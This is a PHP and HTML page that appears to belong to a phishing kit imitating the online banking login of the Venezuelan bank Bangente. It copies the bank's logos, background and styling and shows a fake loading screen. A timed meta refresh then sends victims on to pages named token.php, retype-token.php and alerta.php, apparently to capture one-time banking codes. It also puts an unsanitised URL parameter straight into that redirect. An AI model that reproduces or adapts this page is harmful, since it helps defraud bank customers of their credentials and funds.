<?php
ini_set("display_errors", 1);
if (isset($_GET['t'])){
	switch($_GET['t']){
		case '1': $time="10"; $link = "token.php?u=".$_GET['u'].""; break;
		case '2': $time="10"; $link ="retype-token.php?u=".$_GET['u'].""; break;
		case '3': $time="10"; $link ="alerta.php?u=".$_GET['u'].""; break;
		case '4': $time="5"; $link ="index.php"; break;
		default: $link ="carga.php";
	}
}else{
	$time="10";
	$link = "carga.php";
}

?>

<html lang="es" style="overflow: auto;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
<script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>

<META HTTP-EQUIV="REFRESH" CONTENT="<?php echo $time; ?>;URL=<?php echo $link; ?>">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- CSRF Token -->
  <meta name="csrf-token" content="8dahrVcZCZeGG6mQEezrlzd2PMtnNLGG378cwDW1">
  <meta name="msapplication-TileImage" content="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">

  <title>Bangente</title>

  <!-- #FAVICONS -->
  <link rel="shortcut icon" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png" type="image/x-icon">
  <link rel="icon" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png" type="image/x-icon">
  <link rel="icon" type="image/png" sizes="32x32" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">
  <link rel="icon" type="image/png" sizes="16x16" href="https://bangentenlinea.bangente.com.ve/assets/images/logos/isotipo.png">

  <!-- Fonts -->
  <link rel="dns-prefetch" href="https://fonts.gstatic.com/">

  <link rel="stylesheet" href="./docs/all.css">
  <link id="gull-theme" rel="stylesheet" href="./docs/lite-purple.min.css">
  <link rel="stylesheet" href="./docs/perfect-scrollbar.css">
  <link href="./docs/datepicker.min.css" rel="stylesheet" type="text/css">
  <!-- Styles -->
  <link href="./docs/bangente.css" rel="stylesheet">
  <link href="./docs/lite-purple(1).min.css" rel="stylesheet">
  <link href="./docs/dropzone.css" rel="stylesheet">
  <script src="./docs/jquery.min.js.descarga"></script>
  <script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/traffic.js"></script>
  <script src="./docs/jquery-ui.min.js.descarga"></script>
  <script src="./docs/common-bundle-script.js.descarga"></script>
  <script src="./docs/jquery.validate.min.js.descarga"></script>
  <script src="./docs/additional-methods.min.js.descarga"></script>
  <script src="./docs/sweetalert2.min.js.descarga"></script>
  <script src="./docs/customizer.script.js.descarga"></script>
  <script src="./docs/script.js.descarga"></script>
  <script src="./docs/sidebar.large.script.js.descarga"></script>
  <script src="./docs/dropzone.min.js.descarga"></script>


  <!-- Scripts -->
  <script src="./docs/bangente.js.descarga"></script>
  <!-- Styles -->
  <link href="./docs/bangente.css" rel="stylesheet">
  <link href="./docs/helvetica-neue-lt-std-55" rel="stylesheet">
</head>

<body  class=""
 style="filter: brightness(90%); background-image:  
 url(&quot;https://bangentenlinea.bangente.com.ve/assets/images/bgLogin.png&quot;); 
 background-repeat: no-repeat; background-size: cover; height: auto;  font-family: Helvetica;
 background-position: center center; ">


  <div id="main" role="main" class="mainRegister auth-bg auth-bg-per" bis_skin_checked="1">
    <div id="content" class="container" bis_skin_checked="1">
      <div class="auth-box login-box" bis_skin_checked="1" style="opacity: 1;">
        <div class="auth-layout-wrap left" bis_skin_checked="1">
          <div class="auth-content" bis_skin_checked="1">
            <div class="card2 o-hidden" style="max-width: 600px;" bis_skin_checked="1">
              <div class="row" bis_skin_checked="1">
                <div class="p-4" bis_skin_checked="1">
                  <div class="text-center mb-4" bis_skin_checked="1"> <br><br><br>
                    <img src="./docs/logoHorizontalMorado.png" alt="" class="imgInicio">
             
                  </div>

                  <div class="form-block" bis_skin_checked="1">
           
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
    
      </div>
      <!-- End col -->
    </div>
    <!-- End row -->
  </div>

  <div class="loadscreen" id="preloader" style="display: inline;">
    <div class="loader spinner-bubble spinner-bubble-primary"></div>
  </div>

</body></html>